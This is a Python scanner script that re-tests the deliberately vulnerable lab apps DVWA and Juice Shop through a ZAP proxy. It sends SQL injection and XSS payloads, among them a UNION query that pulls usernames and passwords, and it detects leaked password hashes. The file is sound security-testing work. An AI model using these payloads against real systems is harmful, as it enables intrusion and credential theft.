"""
Enhancement Tool
------------------
Extends ZAP's baseline detection by re-testing endpoints flagged as
vulnerable (or explicitly targeted) with an expanded payload library
built from bypass techniques empirically confirmed during manual ground
truth testing (see results/ground_truth_log.md). Where ZAP's baseline
scan reports a generic "vulnerable: yes/no" finding, this tool adds:

  1. An expanded payload set including filter-bypass techniques
     (quote-free SQLi, nested-tag XSS, <img onerror> XSS, UNION-based
     extraction) confirmed during manual testing but not part of ZAP's
     default payload set.
  2. Response-based verification: confirming exploitability by comparing
     the payload response against a baseline (safe) response - including
     row-count comparison (counting DVWA's per-result marker) and new
     hash-value detection for UNION-based exfiltration - rather than a
     blunt page-size threshold, which gets diluted by large fixed page
     boilerplate (nav, CSS, reference links).
  3. Severity/technique classification: distinguishing "injection point
     confirmed" from "data exfiltration confirmed" from "filter bypass
     required", which ZAP's baseline alerts do not differentiate.

Fix history:
  - v1: tested with unauthenticated session against DVWA - all requests
    silently served the login page. Fixed by authenticating first.
  - v2: flagged any occurrence of "mysql" etc. anywhere in the response
    as an error signature - matched DVWA's own static reference-link
    text on every request regardless of payload, producing uniform false
    positives. Fixed by comparing against a baseline response and only
    counting NEW signatures/status changes as evidence.
  - v3: DVWA's SQLi pages require a companion "Submit=Submit" parameter
    alongside "id" before the query actually executes. Fixed by adding
    an extra_params mechanism per endpoint.
  - v4: response-length threshold (30% larger) was too blunt to detect
    real row-count increases (e.g. 1 row vs 5 rows) against DVWA's large
    fixed page boilerplate. Fixed with a targeted row-count comparison
    (counting "First name:" occurrences) and new-MD5-hash detection for
    UNION-based exfiltration specifically.

Note: DVWA's Blind SQLi module is expected to show "not confirmed" for
most payloads here, since blind SQLi produces no visible page difference
by design - detecting it requires timing-based or boolean-inference
techniques not yet implemented in this version. This is a known,
documented limitation, not a bug.

Usage:
    caffeinate -i python3 enhancement.py
"""

import re
import json
import csv
import requests
from datetime import datetime

ZAP_ADDRESS = 'http://127.0.0.1:8090'

DVWA_BASE = "http://host.docker.internal:8080"
JUICESHOP_BASE = "http://host.docker.internal:3000"

SQLI_PAYLOADS = [
    {"payload": "1' OR '1'='1", "technique": "basic_quote_breakout",
     "description": "Classic quote-breakout, confirms basic injection point"},
    {"payload": "1 OR 1=1", "technique": "quote_free_bypass",
     "description": "No-quote variant - bypasses naive quote-escaping filters"},
    {"payload": "1' UNION SELECT user, password FROM users #", "technique": "union_data_exfiltration",
     "description": "UNION-based extraction - confirms actual data exfiltration impact"},
    {"payload": "1' AND '1'='2", "technique": "logical_control_check",
     "description": "False-condition control test - confirms DB evaluates injected logic (expected to show FEWER results, not more - correctly not flagged as an anomaly)"},
    {"payload": "'(", "technique": "error_trigger_probe",
     "description": "Minimal quote+paren probe - confirmed to trigger a server error on Juice Shop's search endpoint in baseline scan"},
]

XSS_PAYLOADS = [
    {"payload": "<script>alert('XSS')</script>", "technique": "basic_script_tag",
     "description": "Classic script tag injection"},
    {"payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>", "technique": "nested_tag_bypass",
     "description": "Nested-tag bypass - defeats single-pass non-recursive filters"},
    {"payload": "<img src=x onerror=alert('XSS')>", "technique": "event_handler_bypass",
     "description": "Non-script-tag vector via image error handler"},
    {"payload": "<iframe src=\"javascript:alert('XSS')\">", "technique": "iframe_javascript_uri",
     "description": "Alternate vector using iframe javascript: URI"},
]


def authenticate_dvwa():
    print("\n[AUTH] Logging into DVWA via ZAP proxy...")
    proxies = {'http': ZAP_ADDRESS, 'https': ZAP_ADDRESS}
    session = requests.Session()
    session.proxies = proxies
    session.verify = False

    login_page = session.get(f"{DVWA_BASE}/login.php")
    patterns = [
        r"name=[\"']user_token[\"']\s+value=[\"']([a-f0-9]+)[\"']",
        r"value=[\"']([a-f0-9]+)[\"']\s+name=[\"']user_token[\"']",
    ]
    user_token = None
    for pattern in patterns:
        match = re.search(pattern, login_page.text)
        if match:
            user_token = match.group(1)
            break

    if not user_token:
        print("[AUTH] WARNING: could not find CSRF token.")
        return None

    login_data = {"username": "admin", "password": "password", "Login": "Login", "user_token": user_token}
    resp = session.post(f"{DVWA_BASE}/login.php", data=login_data)

    if "Logout" in resp.text or resp.status_code == 302:
        print("[AUTH] DVWA login successful.")
    else:
        print("[AUTH] WARNING: login may have failed.")

    session.post(f"{DVWA_BASE}/security.php", data={"security": "low", "seclev_submit": "Submit"})
    print("[AUTH] DVWA security level set to Low.")
    return session


def get_plain_session():
    proxies = {'http': ZAP_ADDRESS, 'https': ZAP_ADDRESS}
    session = requests.Session()
    session.proxies = proxies
    session.verify = False
    return session


def get_baseline_response(session, url, param, extra_params=None):
    """Send a benign, known-safe value first, to establish what a normal
    response looks like - needed to detect anomalies caused by injection,
    and to avoid flagging static page content as evidence."""
    params = {param: "1"}
    if extra_params:
        params.update(extra_params)
    try:
        r = session.get(url, params=params)
        return r
    except Exception as e:
        print(f"    ERROR getting baseline response: {e}")
        return None


def test_sqli_payload(session, url, param, payload_info, baseline_resp, extra_params=None):
    """Send a single SQLi payload and classify the result using multiple
    targeted evidence checks, each compared against the baseline (safe)
    response rather than checked in absolute terms."""
    payload = payload_info["payload"]
    params = {param: payload}
    if extra_params:
        params.update(extra_params)
    try:
        r = session.get(url, params=params)
    except Exception as e:
        return {"confirmed": False, "reason": f"request_error: {e}", "payload": payload,
                "technique": payload_info["technique"], "description": payload_info["description"], "evidence": ""}

    result = {
        "payload": payload, "technique": payload_info["technique"],
        "description": payload_info["description"], "confirmed": False, "evidence": "",
    }

    error_signatures = ["sql syntax", "you have an error in your sql", "warning: mysqli",
                         "internal server error", "sequelizedatabaseerror"]
    body_lower = r.text.lower()
    baseline_lower = baseline_resp.text.lower() if baseline_resp is not None else ""

    # Check 1: new SQL error signature not present in baseline
    new_error_signatures = [sig for sig in error_signatures
                             if sig in body_lower and sig not in baseline_lower]
    if new_error_signatures:
        result["confirmed"] = True
        result["evidence"] = f"new_sql_error_signature: {new_error_signatures[0]}"
        return result

    # Check 2: HTTP status code anomaly (e.g. 500 where baseline was 200)
    status_anomaly = r.status_code >= 500 and (baseline_resp is None or baseline_resp.status_code < 500)
    if status_anomaly:
        result["confirmed"] = True
        result["evidence"] = f"status_code_anomaly (status={r.status_code})"
        return result

    # Check 3: row-count comparison via DVWA's per-result marker, more
    # precise than raw page-size difference against large fixed boilerplate
    if baseline_resp is not None:
        baseline_rows = baseline_lower.count("first name:")
        response_rows = body_lower.count("first name:")
        if response_rows > baseline_rows:
            result["confirmed"] = True
            result["evidence"] = f"row_count_anomaly (baseline={baseline_rows} rows, this={response_rows} rows)"
            return result

    # Check 4: new MD5-pattern hash values exposed (strong signal for
    # successful UNION-based extraction of password hashes)
    md5_pattern = re.compile(r'\b[a-f0-9]{32}\b')
    new_hashes = set(md5_pattern.findall(body_lower)) - set(md5_pattern.findall(baseline_lower))
    if new_hashes:
        result["confirmed"] = True
        result["evidence"] = f"new_hash_values_exposed (count={len(new_hashes)})"
        return result

    # Check 5: fallback - significant raw response length increase
    if baseline_resp is not None:
        baseline_len = len(baseline_resp.text)
        response_len = len(r.text)
        if response_len > baseline_len * 1.3:
            result["confirmed"] = True
            result["evidence"] = f"response_length_anomaly (baseline={baseline_len}, this={response_len})"
            return result

    result["evidence"] = "no_anomaly_detected"
    return result


def test_xss_payload(session, url, param, payload_info):
    """Send a single XSS payload and confirm exploitability by checking
    whether it appears INTACT and UNESCAPED in the response."""
    payload = payload_info["payload"]
    try:
        r = session.get(url, params={param: payload})
    except Exception as e:
        return {"confirmed": False, "reason": f"request_error: {e}", "payload": payload,
                "technique": payload_info["technique"], "description": payload_info["description"], "evidence": ""}

    result = {
        "payload": payload, "technique": payload_info["technique"],
        "description": payload_info["description"], "confirmed": False, "evidence": "",
    }

    if payload in r.text:
        result["confirmed"] = True
        result["evidence"] = "payload_reflected_unescaped"
    else:
        result["evidence"] = "payload_not_found_or_escaped"

    return result


def run_enhancement(target_name, session, endpoints):
    print(f"\n{'='*50}\nENHANCEMENT: {target_name}\n{'='*50}")
    all_results = []

    for ep in endpoints:
        url, param, vuln_type = ep["url"], ep["param"], ep["vuln_type"]
        extra_params = ep.get("extra_params")
        print(f"\n[TARGET ENDPOINT] {url} (param={param}, type={vuln_type})")

        if vuln_type == "sqli":
            baseline_resp = get_baseline_response(session, url, param, extra_params)
            for payload_info in SQLI_PAYLOADS:
                res = test_sqli_payload(session, url, param, payload_info, baseline_resp, extra_params)
                res.update({"target": target_name, "url": url, "param": param, "vuln_type": "sqli"})
                status = "CONFIRMED" if res["confirmed"] else "not confirmed"
                print(f"    [{res['technique']}] {status} - {res['evidence']}")
                all_results.append(res)

        elif vuln_type == "xss":
            for payload_info in XSS_PAYLOADS:
                res = test_xss_payload(session, url, param, payload_info)
                res.update({"target": target_name, "url": url, "param": param, "vuln_type": "xss"})
                status = "CONFIRMED" if res["confirmed"] else "not confirmed"
                print(f"    [{res['technique']}] {status} - {res['evidence']}")
                all_results.append(res)

    return all_results


def save_results(target_name, results):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_path = f"results/enhancement_{target_name}_{timestamp}.json"
    with open(json_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[SAVE] {target_name} enhancement results saved to {json_path}")

    csv_path = f"results/enhancement_{target_name}_{timestamp}.csv"
    with open(csv_path, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["target", "url", "param", "vuln_type", "technique", "payload", "confirmed", "evidence"])
        for r in results:
            writer.writerow([
                r.get("target"), r.get("url"), r.get("param"), r.get("vuln_type"),
                r.get("technique"), r.get("payload"), r.get("confirmed"), r.get("evidence"),
            ])
    print(f"[SAVE] {target_name} enhancement CSV saved to {csv_path}")


if __name__ == "__main__":
    dvwa_session = authenticate_dvwa()

    dvwa_endpoints = [
        {"url": f"{DVWA_BASE}/vulnerabilities/sqli/", "param": "id", "vuln_type": "sqli",
         "extra_params": {"Submit": "Submit"}},
        {"url": f"{DVWA_BASE}/vulnerabilities/sqli_blind/", "param": "id", "vuln_type": "sqli",
         "extra_params": {"Submit": "Submit"}},
        {"url": f"{DVWA_BASE}/vulnerabilities/xss_r/", "param": "name", "vuln_type": "xss"},
    ]

    if dvwa_session:
        dvwa_results = run_enhancement("dvwa", dvwa_session, dvwa_endpoints)
        save_results("dvwa", dvwa_results)
    else:
        print("[ERROR] DVWA authentication failed, skipping DVWA enhancement tests.")

    juiceshop_session = get_plain_session()
    juiceshop_endpoints = [
        {"url": f"{JUICESHOP_BASE}/rest/products/search", "param": "q", "vuln_type": "sqli"},
    ]
    juiceshop_results = run_enhancement("juiceshop", juiceshop_session, juiceshop_endpoints)
    save_results("juiceshop", juiceshop_results)

    print("\nEnhancement run complete.")